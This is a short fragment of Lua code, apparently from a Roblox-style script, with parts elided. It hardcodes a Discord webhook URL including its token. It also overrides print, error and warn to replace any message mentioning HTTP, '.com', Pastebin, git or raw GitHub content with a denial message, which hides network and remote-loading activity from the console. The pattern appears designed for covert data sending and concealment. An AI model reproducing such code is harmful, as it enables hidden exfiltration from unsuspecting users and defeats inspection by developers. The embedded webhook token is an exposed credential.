...
local url = "https://discord.com/api/webhooks/1242763436153110569/xp-RJKw3Uh4qZZP_dc9lhIrMI9SRLhsqJoJ1Gfc-pdZyYN5qYk_v1B2FDS9o48XnTqVa"
...
local function filterOutput(outputFunction)
    return function(message, ...)
        if string.match(message, "HTTP") or string.match(message, "http") or string.match(message, ".com") or 
           string.match(message, "Http") or string.match(message, "Paste") or string.match(message, "bin") or 
           string.match(message, "gitusercontent") or string.match(message, "git") then
            message = deniedMessage
        end
        return outputFunction(message, ...)
    end
end

print = filterOutput(print)
error = filterOutput(error)
warn = filterOutput(warn)
